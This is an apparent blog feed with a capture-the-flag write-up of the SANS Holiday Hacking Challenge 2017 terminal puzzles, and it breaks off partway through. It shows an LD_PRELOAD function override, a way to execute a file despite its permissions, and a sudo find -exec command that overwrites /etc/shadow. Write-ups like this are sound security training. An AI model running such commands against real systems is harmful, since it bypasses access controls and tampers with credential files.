<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-01-16T00:06:36+01:00</updated><id>http://localhost:4000/</id><title type="html">H4ck and that</title><subtitle>Blog for herrfeder</subtitle><author><name>herrfeder</name></author><entry><title type="html">SANS Holiday Hacking Challenge</title><link href="http://localhost:4000/ctf/2018/01/04/SANS-Holiday-Hacking-Challenge-2017.html" rel="alternate" type="text/html" title="SANS Holiday Hacking Challenge" /><published>2018-01-04T17:00:00+01:00</published><updated>2018-01-04T17:00:00+01:00</updated><id>http://localhost:4000/ctf/2018/01/04/SANS-Holiday-Hacking-Challenge-2017</id><content type="html" xml:base="http://localhost:4000/ctf/2018/01/04/SANS-Holiday-Hacking-Challenge-2017.html">&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#overview&quot; id=&quot;markdown-toc-overview&quot;&gt;Overview&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#terminal-challenges&quot; id=&quot;markdown-toc-terminal-challenges&quot;&gt;Terminal Challenges&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#isit42-overwrite-c-functions-with-preload--wunorse-openslae&quot; id=&quot;markdown-toc-isit42-overwrite-c-functions-with-preload--wunorse-openslae&quot;&gt;Isit42 (Overwrite C-Functions with Preload)  Wunorse Openslae&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#kill-santaslittlehelperd-sparkle-redberry&quot; id=&quot;markdown-toc-kill-santaslittlehelperd-sparkle-redberry&quot;&gt;Kill santaslittlehelperd Sparkle Redberry&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#execute-elftalkd-bushy-evergreen&quot; id=&quot;markdown-toc-execute-elftalkd-bushy-evergreen&quot;&gt;Execute elftalkd Bushy Evergreen&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#starting-arm-train-binary-pepper-minstix&quot; id=&quot;markdown-toc-starting-arm-train-binary-pepper-minstix&quot;&gt;Starting ARM Train binary Pepper Minstix&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#execute-file-without-permissions-holly-evergreen&quot; id=&quot;markdown-toc-execute-file-without-permissions-holly-evergreen&quot;&gt;Execute File without Permissions Holly Evergreen&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#extract-information-minty-candycane&quot; id=&quot;markdown-toc-extract-information-minty-candycane&quot;&gt;Extract Information Minty Candycane&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#edit-shadow-without-rights-shinny-upatree&quot; id=&quot;markdown-toc-edit-shadow-without-rights-shinny-upatree&quot;&gt;Edit Shadow without Rights Shinny Upatree&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#inspecting-christmassongsdb-sugarplum-mary&quot; id=&quot;markdown-toc-inspecting-christmassongsdb-sugarplum-mary&quot;&gt;Inspecting christmassongs.db Sugarplum Mary&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#apache-struts-server&quot; id=&quot;markdown-toc-apache-struts-server&quot;&gt;Apache Struts Server&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#network-reconnaisance&quot; id=&quot;markdown-toc-network-reconnaisance&quot;&gt;Network Reconnaisance&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#windows-smb-server&quot; id=&quot;markdown-toc-windows-smb-server&quot;&gt;Windows SMB Server&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#mail-server-with-custom-cookie-based-encryption&quot; id=&quot;markdown-toc-mail-server-with-custom-cookie-based-encryption&quot;&gt;Mail Server with custom Cookie based encryption&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#online-resource-management-with-xml-external-entity-xxe-vulnerability&quot; id=&quot;markdown-toc-online-resource-management-with-xml-external-entity-xxe-vulnerability&quot;&gt;Online Resource Management with XML External Entity (XXE) Vulnerability&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#database-with-xss-vulnerability-javascript-web-token-jwt-vulnerability-and-ldap-injection-vulnerability&quot; id=&quot;markdown-toc-database-with-xss-vulnerability-javascript-web-token-jwt-vulnerability-and-ldap-injection-vulnerability&quot;&gt;Database with XSS Vulnerability, JavaScript Web Token (JWT) Vulnerability and LDAP Injection Vulnerability&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#xss&quot; id=&quot;markdown-toc-xss&quot;&gt;XSS&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#jwt&quot; id=&quot;markdown-toc-jwt&quot;&gt;JWT&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;

&lt;p&gt;I will cut the lovely story behind the hacking tasks short. The homebase of Santa Clause is threatened by Giant Snowballs. Someone or something is throwing these snowballs onto the peaceful christmastown and you have to find out what’s going on. To get some hints you have to solve some terminal challenges. That are web emulated shells with a given task. For solving these tasks one of the busy christmals elves will give you hints for the main tasks.&lt;/p&gt;

&lt;h2 id=&quot;terminal-challenges&quot;&gt;Terminal Challenges&lt;/h2&gt;

&lt;h3 id=&quot;isit42-overwrite-c-functions-with-preload--wunorse-openslae&quot;&gt;Isit42 (Overwrite C-Functions with Preload)  Wunorse Openslae&lt;/h3&gt;

&lt;p&gt;Opening the Terminal will welcome you with the description for the challenge:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Wunorse Openslae has a special challenge &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you.
Run the given binary, make it &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;42.
Use the partial &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;hints, it is just a clue.
You will need to write your own code, but only a line or two.
total 88
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root root 84824 Dec 16 16:56 isit42
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root   654 Dec 16 16:56 isit42.c.un
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There is a file given that includes the important parts of the binary:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
// DATA CORRUPTION ERROR
// MUCH OF THIS CODE HAS BEEN LOST
// FORTUNATELY, YOU DON'T NEED IT FOR THIS CHALLENGE
// MAKE THE isit42 BINARY RETURN 42
// YOU'LL NEED TO WRITE A SEPERATE C SOURCE TO WIN EVERY TIME
int getrand() {
    srand((unsigned int)time(NULL)); 
    printf(&quot;Calling rand() to select a random number.\n&quot;);
    // The prototype for rand is: int rand(void);
    return rand() % 4096; // returns a pseudo-random integer between 0 and 4096
}
int main() {
    sleep(3);
    int randnum = getrand();
    if (randnum == 42) {
        printf(&quot;Yay!\n&quot;);
    } else {
        printf(&quot;Boo!\n&quot;);
    }
    return randnum;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;With the hint from &lt;a href=&quot;https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win&quot;&gt;SANS Blog&lt;/a&gt; it was obvious that I can use &lt;code class=&quot;highlighter-rouge&quot;&gt;LD_PRELOAD&lt;/code&gt; to overwrite standard libc functions. overwrite_getrand.c :&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
int rand() {
return 4138;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When compiling you have to use specific flags:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc overwrite_getrand.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; overwrite_getrand &lt;span class=&quot;nt&quot;&gt;-shared&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fPIC&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;shared will create a shared library&lt;/li&gt;
  &lt;li&gt;fPIC is used to create position independent code
This will make sure it overwrites functions from other shared libraries.
When executing it will now output the right value.
    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;LD_PRELOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/overwrite_getrand&quot;&lt;/span&gt; ./isit42
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;kill-santaslittlehelperd-sparkle-redberry&quot;&gt;Kill santaslittlehelperd Sparkle Redberry&lt;/h3&gt;

&lt;p&gt;Sparkle will give you a very easy and hard task, too, when you are not looking into the right files.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me &lt;span class=&quot;nb&quot;&gt;kill &lt;/span&gt;the troublesome process gone awry.
I will &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;the favor with a gift before nigh.
Kill the &lt;span class=&quot;s2&quot;&gt;&quot;santaslittlehelperd&quot;&lt;/span&gt; process to &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;this challenge.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@efae06a0bf5f:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ps &lt;span class=&quot;nt&quot;&gt;-fax&lt;/span&gt;
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  107 pts/0    R+     0:00  &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt; ps &lt;span class=&quot;nt&quot;&gt;-fax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After some damning about this task because of it simplicity I got the problem.
All popular commands to kill processes have aliases to prevent actually killing anything. That feels like monkeyshines for admins.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@efae06a0bf5f:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;alias
alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;amp;&amp;amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e '&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'s/^\s*[0-9]\+\s*//;s/[;&amp;amp;|]\s*alert$//'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;')&quot;'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;egrep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'egrep --color=auto'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;fgrep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'fgrep --color=auto'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias grep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'grep --color=auto'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias kill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;killall&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls -CF'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;la&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls -A'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls -alF'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias ls&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ls --color=auto'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;pkill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;alias &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;skill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'true'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this knowledge I used “top” and pressed k to kill the process. Afterwards you have to refresh the page to solve it silently.&lt;/p&gt;

&lt;h3 id=&quot;execute-elftalkd-bushy-evergreen&quot;&gt;Execute elftalkd Bushy Evergreen&lt;/h3&gt;

&lt;p&gt;Bushy wants you to find a executable. When you are familiar with grep this is very easy.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Bushy Evergreen, and I have a problem &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you.
I think a server got owned, and I can only offer a clue.
We use the system &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;chat, to keep toy production running.
Can you &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;us recover from the server connection shunning?
Find and run the elftalkd binary to &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;this challenge.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;When using grep with recursive option on the system root you can find it easily.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@11cb77f0b8ea:~$ grep -rli elftalkd / 2&amp;gt;/dev/null | grep elftalk
/run/elftalk/bin/elftalkd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;starting-arm-train-binary-pepper-minstix&quot;&gt;Starting ARM Train binary Pepper Minstix&lt;/h3&gt;

&lt;p&gt;Seeing a nice ASCII train Pepper would like you to execute a given binary.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Pepper Minstix, and I need your &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;with my plight.
I&lt;span class=&quot;s1&quot;&gt;'ve crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.


total 444
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It’s executable by anyone but it’s the architecture that matters:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@bdaf2542fc01:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, statically linked, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;My first thought is emulation and I guess thats the intended solution:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@bdaf2542fc01:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/qemu-arm trainstartup 
Starting up ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;execute-file-without-permissions-holly-evergreen&quot;&gt;Execute File without Permissions Holly Evergreen&lt;/h3&gt;

&lt;p&gt;Hollys challenge will ask you to execute a file.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.
Run the CandyCaneStriper executable to complete this challenge.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The desired file isn’t owned by your user:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 68
drwxr-xr-x 1 elf  elf   4096 Dec 15 20:00 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 elf  elf    220 Aug 31  2015 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  3143 Dec 15 19:59 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 elf  elf    655 May 16  2017 .profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root 45224 Dec 15 19:59 CandyCaneStriper
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As it is allowed to read the file and we can use encoding utilities like base64 we can simply copy the content into a new file and execute it.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;CandyCaneStriper | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; CandyCaneStriper_base64
elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;CandyCaneStriper_base64 | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; CandyCaneStriper_elf
elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/touch test_file
elf@a986aaa7e476:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp &lt;/span&gt;CandyCaneStriper_elf test_file
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;extract-information-minty-candycane&quot;&gt;Extract Information Minty Candycane&lt;/h3&gt;

&lt;p&gt;Minty gives us a http server log and wants us to find the least popular one:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Minty Candycane here, I need your &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;straight away.
We&lt;span class=&quot;s1&quot;&gt;'re having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maybe there are more elegant ways to exclude information progressively but it was the easiest way at first glance:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;access.log | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; facebook | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; mozilla | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; safari | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; zmeu | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; slack | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; sysscan | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; googlebot | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; twitter | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; wget | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; masscan | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; python 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;After excluding a lot of browser entries I found the one, that occurs only a single time. I never heard of it:
Dillo&lt;/p&gt;

&lt;h3 id=&quot;edit-shadow-without-rights-shinny-upatree&quot;&gt;Edit Shadow without Rights Shinny Upatree&lt;/h3&gt;

&lt;p&gt;Shinny wants you to edit the shadow file without the needed permissions:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run &quot;inspect_da_box&quot; to complete this challenge.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;When inspecting the sudoers file it occurs that my user is allowed to run &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; with shadow group rights. As find allows many exec operations on top it’s easy to cook a bash command:&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shadow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;find&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shadow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cp&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shadow&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;inspecting-christmassongsdb-sugarplum-mary&quot;&gt;Inspecting christmassongs.db Sugarplum Mary&lt;/h3&gt;

&lt;p&gt;Sugarplum would like you to do some SQL queries to find the most popular christmas song.&lt;/p&gt;

